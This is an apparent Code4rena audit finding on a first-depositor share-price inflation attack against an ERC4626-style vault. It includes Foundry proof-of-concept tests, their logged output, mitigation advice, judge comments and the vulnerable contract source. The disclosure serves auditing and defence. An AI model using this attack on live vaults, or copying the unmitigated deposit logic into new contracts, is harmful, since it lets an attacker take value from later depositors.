{
  "Title": "[M-02] First xERC4626 deposit exploit can break share calculation",
  "Content": "_Submitted by VAD37_\n\nSolmate `convertToShares` [function](https://github.com/Rari-Capital/solmate/blob/12421e3edee21cfb99bf5a6edd6169e6497511de/src/mixins/ERC4626.sol#L133) follow the formula: `assetDepositAmount * totalShareSupply / assetBalanceBeforeDeposit`.\n\nThe share price always return 1:1 with asset token. If everything work normally, share price will slowly increase with time to 1:2 or 1:10 as more rewards coming in.\n\nBut right after xERC4626 contract creation, during first cycle, any user can deposit 1 share set `totalSupply = 1`. And transfer token to vault to inflate `totalAssets()` before rewards kick in. (Basically, pretend rewards themselves before anyone can deposit in to get much better share price.)\n\nThis can inflate base share price as high as 1:1e18 early on, which force all subsequence deposit to use this share price as base.\n\n### Impact\n\nNew xERC4626 vault share price can be manipulated right after creation.\nWhich give early depositor greater share portion of the vault during the first cycle.\n\nWhile deposit token also affected by rounding precision (due to exploit above) that always return lesser amount of share for user.\n\n### Proof of Concept\n\nAdd these code to `xERC4626Test.t.sol` file to test.\n\n```js\n\n    function testExploitNormalCase() public {\n        token.mint(address(this), 1e24); // funding\n        token.approve(address(xToken), type(uint256).max);\n        xToken.syncRewards();\n        hevm.warp(1); // skip 1 block from sync rewards. to update new TotalAsset() value\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n        emit log_named_uint(\"deposit 1e18  \", xToken.deposit(1e18, address(this)));\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n        emit log_named_uint(\"deposit 500e18\", xToken.deposit(500e18, address(this)));\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n        emit log_named_uint(\"deposit 500e18\", xToken.deposit(500e18, address(this)));\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n        emit log_string(\"fast forward 1 hour to new rewards cycle\");\n        hevm.warp(3601); // new cycle\n        emit log_named_uint(\"deposit 2e18  \", xToken.deposit(2e18, address(this)));\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n        emit log_named_uint(\"deposit 500e18\", xToken.deposit(500e18, address(this)));\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n        // Share price stay the same 1:1. Due to no rewards have been given.\n    }\n\n    function testExploitShare() public {\n        token.mint(address(this), 1e24); // funding\n        token.approve(address(xToken), type(uint256).max);\n\n        // init total supply as 1:1 share with token as one.\n        xToken.deposit(1, address(this));\n\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n        emit log_string(\"transfer 100e18 fake token rewards to inflate share price\");\n        // transfer fake rewards token to xToken contract to inflate totalAsset()\n        token.transfer(address(xToken), 100e18);\n        xToken.syncRewards();\n        hevm.warp(1); // skip 1 block from sync rewards. to update new TotalAsset() value\n\n        // totalSupply() still 1. So current share price is ~ 1e18 token instead of 1:1 for token.\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n        emit log_named_uint(\"deposit 1e18  \", xToken.deposit(1e18, address(this)));\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n        emit log_named_uint(\"deposit 500e18\", xToken.deposit(500e18, address(this)));\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n        emit log_named_uint(\"deposit 500e18\", xToken.deposit(500e18, address(this)));\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n        // After new cycle come around. No rewards have been given.\n        // But TotalAsset() have been updated to include fake rewards transfer above.\n        // this push share price even higher than it should be.\n        emit log_string(\"fast forward 1 hour to new rewards cycle\");\n        hevm.warp(3601); // new cycle\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n        emit log_named_uint(\"deposit 2e18  \", xToken.deposit(2e18, address(this)));\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n        emit log_named_uint(\"deposit 500e18\", xToken.deposit(500e18, address(this)));\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n        // xToken.syncRewards();\n        // hevm.warp(7202); // new cycle\n        // Test rounding up value of share\n        emit log_named_uint(\"deposit 1.3e17\", xToken.deposit(1.3e17, address(this)));\n        emit log_named_uint(\"deposit 1.9e17\", xToken.deposit(1.9e17, address(this)));\n        emit log_named_uint(\"deposit 2e17  \", xToken.deposit(2e17, address(this)));\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n        emit log_named_uint(\"deposit 2.5e17\", xToken.deposit(2.5e17, address(this)));\n        // token too small will be reverted.\n        hevm.expectRevert(abi.encodePacked(\"ZERO_SHARES\"));\n        xToken.deposit(1e17, address(this));\n        emit log_string(\"deposit token less than share price amount will be reverted with zero share error\");\n\n        emit log_string(\"fast forward 1 hour to new rewards cycle\");\n        xToken.syncRewards();\n        hevm.warp(7610); // new cycle\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n\n        emit log_string(\"fast forward 1 hour to new rewards cycle\");\n        xToken.syncRewards();\n        hevm.warp(7610+3601); // new cycle\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n    }\n```\n\nLog Result:\n\n```js\nRunning 2 tests for src\\test\\xERC4626.t.sol:xERC4626Test\n[PASS] testExploitNormalCase() (gas: 286966)\nLogs:\n  share price   : 1\n  deposit 1e18  : 1000000000000000000\n  share price   : 1\n  deposit 500e18: 500000000000000000000\n  share price   : 1\n  deposit 500e18: 500000000000000000000\n  share price   : 1\n  fast forward 1 hour to new rewards cycle\n  deposit 2e18  : 2000000000000000000\n  share price   : 1\n  deposit 500e18: 500000000000000000000\n  share price   : 1\n\n[PASS] testExploitShare() (gas: 410737)\nLogs:\n  share price   : 1\n  transfer 100e18 fake token rewards to inflate share price\n  share price   : 100000000000000001\n  deposit 1e18  : 9\n  share price   : 110000000000000000\n  deposit 500e18: 4545\n  share price   : 110010976948408342\n  deposit 500e18: 4545\n  share price   : 110010989010989010\n  fast forward 1 hour to new rewards cycle\n  share price   : 120989010989010989\n  deposit 2e18  : 16\n  share price   : 120996050899517332\n  deposit 500e18: 4132\n  share price   : 120999396135265700\n  deposit 1.3e17: 1\n  deposit 1.9e17: 1\n  deposit 2e17  : 1\n  share price   : 121011244434382310\n  deposit 2.5e17: 2\n  deposit token less than share price amount will be reverted due to return 0 share\n  fast forward 1 hour to new rewards cycle\n  share price   : 121011846374405794\n  fast forward 1 hour to new rewards cycle\n  share price   : 121011846374405794\n\nTest result: ok. 2 passed; 0 failed; finished in 20.78ms\n```\n\n### Recommended Mitigation Steps\n\nThis exploit is unique to contract similar to ERC4626. It only works if starting supply equal 0 or very small number and rewards cycle is very short. Or everyone withdraws, total share supply become 0.\n\nThis can be easily fix by making sure someone always deposited first so `totalSupply` become high enough that this exploit become irrelevant. Unless in unlikely case someone made arbitrage bot watching vault factory contract.<br>\nJust force deposit early token during vault construction as last resort.\n\n**[Joeysantoro (xTRIBE) commented](https://github.com/code-423n4/2022-04-xtribe-findings/issues/66#issuecomment-1126303570):**\n > https://github.com/Rari-Capital/solmate/pull/174/files this is a known issue with 4626. xTRIBE would be initialized safely in this case.\n\n**[0xean (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-04-xtribe-findings/issues/66#issuecomment-1132027880):**\n > Known or unknown this is still a valid attack that isn't mitigated for in the current codebase.  Given that there are mitigations that could be integrated on chain (like in the uniswap contracts that burn the first dust amount of LP tokens) , and the warden did demonstrate the attack I am going to downgrade this to medium severity as a \"leak of value\".\n> \n> `\n> 2 â€” Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n> `\n\n\n\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/contests/2022-04-xtribe-contest",
  "Code": [
    {
      "filename": "src/mixins/ERC4626.sol",
      "content": "// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity >=0.8.0;\n\nimport {ERC20} from \"../tokens/ERC20.sol\";\nimport {SafeTransferLib} from \"../utils/SafeTransferLib.sol\";\nimport {FixedPointMathLib} from \"../utils/FixedPointMathLib.sol\";\n\n/// @notice Minimal ERC4626 tokenized Vault implementation.\n/// @author Solmate (https://github.com/Rari-Capital/solmate/blob/main/src/mixins/ERC4626.sol)\nabstract contract ERC4626 is ERC20 {\n    using SafeTransferLib for ERC20;\n    using FixedPointMathLib for uint256;\n\n    /*//////////////////////////////////////////////////////////////\n                                 EVENTS\n    //////////////////////////////////////////////////////////////*/\n\n    event Deposit(address indexed caller, address indexed owner, uint256 assets, uint256 shares);\n\n    event Withdraw(\n        address indexed caller,\n        address indexed receiver,\n        address indexed owner,\n        uint256 assets,\n        uint256 shares\n    );\n\n    /*//////////////////////////////////////////////////////////////\n                               IMMUTABLES\n    //////////////////////////////////////////////////////////////*/\n\n    ERC20 public immutable asset;\n\n    constructor(\n        ERC20 _asset,\n        string memory _name,\n        string memory _symbol\n    ) ERC20(_name, _symbol, _asset.decimals()) {\n        asset = _asset;\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                        DEPOSIT/WITHDRAWAL LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function deposit(uint256 assets, address receiver) public virtual returns (uint256 shares) {\n        // Check for rounding error since we round down in previewDeposit.\n        require((shares = previewDeposit(assets)) != 0, \"ZERO_SHARES\");\n\n        // Need to transfer before minting or ERC777s could reenter.\n        asset.safeTransferFrom(msg.sender, address(this), assets);\n\n        _mint(receiver, shares);\n\n        emit Deposit(msg.sender, receiver, assets, shares);\n\n        afterDeposit(assets, shares);\n    }\n\n    function mint(uint256 shares, address receiver) public virtual returns (uint256 assets) {\n        assets = previewMint(shares); // No need to check for rounding error, previewMint rounds up.\n\n        // Need to transfer before minting or ERC777s could reenter.\n        asset.safeTransferFrom(msg.sender, address(this), assets);\n\n        _mint(receiver, shares);\n\n        emit Deposit(msg.sender, receiver, assets, shares);\n\n        afterDeposit(assets, shares);\n    }\n\n    function withdraw(\n        uint256 assets,\n        address receiver,\n        address owner\n    ) public virtual returns (uint256 shares) {\n        shares = previewWithdraw(assets); // No need to check for rounding error, previewWithdraw rounds up.\n\n        if (msg.sender != owner) {\n            uint256 allowed = allowance[owner][msg.sender]; // Saves gas for limited approvals.\n\n            if (allowed != type(uint256).max) allowance[owner][msg.sender] = allowed - shares;\n        }\n\n        beforeWithdraw(assets, shares);\n\n        _burn(owner, shares);\n\n        emit Withdraw(msg.sender, receiver, owner, assets, shares);\n\n        asset.safeTransfer(receiver, assets);\n    }\n\n    function redeem(\n        uint256 shares,\n        address receiver,\n        address owner\n    ) public virtual returns (uint256 assets) {\n        if (msg.sender != owner) {\n            uint256 allowed = allowance[owner][msg.sender]; // Saves gas for limited approvals.\n\n            if (allowed != type(uint256).max) allowance[owner][msg.sender] = allowed - shares;\n        }\n\n        // Check for rounding error since we round down in previewRedeem.\n        require((assets = previewRedeem(shares)) != 0, \"ZERO_ASSETS\");\n\n        beforeWithdraw(assets, shares);\n\n        _burn(owner, shares);\n\n        emit Withdraw(msg.sender, receiver, owner, assets, shares);\n\n        asset.safeTransfer(receiver, assets);\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                            ACCOUNTING LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function totalAssets() public view virtual returns (uint256);\n\n    function convertToShares(uint256 assets) public view virtual returns (uint256) {\n        uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.\n\n        return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());\n    }\n\n    function convertToAssets(uint256 shares) public view virtual returns (uint256) {\n        uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.\n\n        return supply == 0 ? shares : shares.mulDivDown(totalAssets(), supply);\n    }\n\n    function previewDeposit(uint256 assets) public view virtual returns (uint256) {\n        return convertToShares(assets);\n    }\n\n    function previewMint(uint256 shares) public view virtual returns (uint256) {\n        uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.\n\n        return supply == 0 ? shares : shares.mulDivUp(totalAssets(), supply);\n    }\n\n    function previewWithdraw(uint256 assets) public view virtual returns (uint256) {\n        uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.\n\n        return supply == 0 ? assets : assets.mulDivUp(supply, totalAssets());\n    }\n\n    function previewRedeem(uint256 shares) public view virtual returns (uint256) {\n        return convertToAssets(shares);\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                     DEPOSIT/WITHDRAWAL LIMIT LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function maxDeposit(address) public view virtual returns (uint256) {\n        return type(uint256).max;\n    }\n\n    function maxMint(address) public view virtual returns (uint256) {\n        return type(uint256).max;\n    }\n\n    function maxWithdraw(address owner) public view virtual returns (uint256) {\n        return convertToAssets(balanceOf[owner]);\n    }\n\n    function maxRedeem(address owner) public view virtual returns (uint256) {\n        return balanceOf[owner];\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                          INTERNAL HOOKS LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function beforeWithdraw(uint256 assets, uint256 shares) internal virtual {}\n\n    function afterDeposit(uint256 assets, uint256 shares) internal virtual {}\n}"
    }
  ]
}